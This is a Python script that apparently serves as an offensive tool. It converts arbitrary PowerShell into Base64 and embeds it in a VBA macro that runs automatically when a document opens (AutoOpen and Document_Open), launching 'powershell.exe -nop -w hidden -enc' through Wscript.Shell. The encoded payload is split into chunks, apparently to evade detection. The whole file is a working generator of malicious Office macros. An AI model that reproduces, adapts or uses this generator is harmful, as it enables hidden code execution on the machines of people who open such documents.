#!/usr/bin/env python3
"""
ps2vba_chunk.py – Convert PowerShell to UTF-16LE Base64 and embed
it into a VBA macro, splitting the encoded string into fixed-length chunks.

Usage examples
--------------
$ ./ps2vba_chunk.py 'Get-Process|Out-String'
$ ./ps2vba_chunk.py -f script.ps1 -o macro.vba
"""
import argparse
import base64
import pathlib
import sys
import textwrap

TEMPLATE_HEADER = textwrap.dedent("""\
    Sub AutoOpen()
        MyMacro
    End Sub

    Sub Document_Open()
        MyMacro
    End Sub

    Sub MyMacro()
        Dim Str As String
        Str = Str + "powershell.exe -nop -w hidden -enc "
""")

TEMPLATE_FOOTER = textwrap.dedent("""\
        CreateObject("Wscript.Shell").Run Str
    End Sub
""")

def encode_ps(code: str) -> str:
    """Encode a PowerShell command as UTF-16LE Base64."""
    return base64.b64encode(code.encode("utf-16le")).decode()

def chunk(text: str, length: int = 50):
    """Yield successive *length*-sized chunks from *text*."""
    for i in range(0, len(text), length):
        yield text[i : i + length]

def build_vba(encoded: str, chunk_len: int = 50) -> str:
    """Return the final VBA macro with the encoded string split into chunks."""
    lines = [f'        Str = Str + "{part}"' for part in chunk(encoded, chunk_len)]
    return TEMPLATE_HEADER + "\n".join(lines) + "\n" + TEMPLATE_FOOTER

def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Embed a PowerShell script as a Base64-encoded VBA macro."
    )
    parser.add_argument(
        "command",
        nargs="?",
        help="PowerShell one-liner (ignored if -f is used)",
    )
    parser.add_argument(
        "-f", "--file",
        metavar="PS1",
        help="read the PowerShell script from FILE",
    )
    parser.add_argument(
        "-o", "--out",
        metavar="VBA",
        help="write the generated macro to FILE (stdout by default)",
    )
    parser.add_argument(
        "-c", "--chunk",
        type=int,
        default=50,
        metavar="N",
        help="split the encoded string every N characters (default: 50)",
    )
    args = parser.parse_args(argv)

    # Get the PowerShell source
    if args.file:
        ps_code = pathlib.Path(args.file).read_text(
            encoding="utf-8",
            errors="ignore",
        )
    elif args.command:
        ps_code = args.command
    else:
        parser.error("PowerShell code missing (use -f or positional argument)")

    encoded = encode_ps(ps_code.strip())
    vba_macro = build_vba(encoded, args.chunk)

    if args.out:
        pathlib.Path(args.out).write_text(vba_macro, encoding="utf-8")
    else:
        print(vba_macro)

if __name__ == "__main__":
    sys.exit(main())

